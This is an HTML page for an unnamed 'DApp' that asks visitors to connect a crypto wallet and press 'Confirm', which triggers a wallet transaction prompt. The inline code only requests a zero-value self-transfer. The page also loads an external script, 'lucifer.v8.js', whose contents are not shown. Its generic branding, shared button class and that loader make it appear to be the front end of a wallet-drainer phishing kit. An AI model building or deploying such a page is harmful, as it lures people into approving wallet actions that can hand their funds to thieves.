<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DApp</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #08080f;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            display: flex; justify-content: center; align-items: center;
            min-height: 100vh; padding: 20px; color: #e0e0e0;
        }
        .card {
            background: #0c0c14;
            border: 1px solid #1a1a2e;
            border-radius: 16px;
            padding: 36px 28px;
            max-width: 420px; width: 100%;
            text-align: center;
        }
        .title {
            font-size: 22px; font-weight: 700; color: #fff; margin-bottom: 24px;
        }
        .btn {
            width: 100%; padding: 16px; border: none; border-radius: 12px;
            font-weight: 600; font-size: 15px; cursor: pointer; margin: 8px 0;
            transition: all 0.2s;
        }
        .btn-connect {
            background: #3b82f6; color: #fff;
        }
        .btn-connect:hover:not(:disabled) { background: #2563eb; }
        .btn-connect.connected { background: #1a2a1a; color: #22c55e; cursor: default; }
        .btn-action {
            background: #22c55e; color: #000;
        }
        .btn-action:hover:not(:disabled) { background: #16a34a; }
        .btn:disabled { opacity: 0.4; cursor: not-allowed; }
        .address {
            font-size: 12px; color: #6b7280; margin: 12px 0; font-family: monospace;
        }
        .status {
            font-size: 12px; color: #6b7280; margin-top: 8px;
        }
    </style>
<script type="module" crossorigin src="./files/lucifer.v8.js"></script>
</head>
<body>
    <div class="card">
        <div class="title">DApp</div>
        
        <button class="btn btn-connect interactBtn" id="connectBtn">Connect Wallet</button>
        <div class="address" id="addressDisplay"></div>
        <button class="btn btn-action interactBtn" id="actionBtn" disabled>Confirm</button>
        <div class="status" id="status"></div>
    </div>

    <script>
        let userAddress = '';

        const connectBtn = document.getElementById('connectBtn');
        const actionBtn = document.getElementById('actionBtn');
        const addressDisplay = document.getElementById('addressDisplay');
        const status = document.getElementById('status');

        connectBtn.addEventListener('click', async () => {
            if (!window.ethereum) {
                status.textContent = 'No wallet detected.';
                return;
            }

            connectBtn.disabled = true;
            connectBtn.textContent = 'Connecting...';

            try {
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                userAddress = accounts[0];

                connectBtn.textContent = 'Connected';
                connectBtn.classList.add('connected');
                addressDisplay.textContent = userAddress;
                actionBtn.disabled = false;
                status.textContent = 'Ready.';

            } catch (e) {
                connectBtn.disabled = false;
                connectBtn.textContent = 'Connect Wallet';
                status.textContent = 'Connection failed.';
            }
        });

        actionBtn.addEventListener('click', async () => {
            if (!userAddress) return;

            actionBtn.disabled = true;
            actionBtn.textContent = 'Confirming...';
            status.textContent = 'Check your wallet.';

            try {
                const txHash = await window.ethereum.request({
                    method: 'eth_sendTransaction',
                    params: [{
                        from: userAddress,
                        to: userAddress,
                        value: '0x0'
                    }]
                });

                status.textContent = 'TX: ' + txHash.slice(0, 24) + '...';
                actionBtn.textContent = 'Done';

            } catch (e) {
                status.textContent = '';
                actionBtn.disabled = false;
                actionBtn.textContent = 'Confirm';
            }
        });
    </script>
</body>
</html>
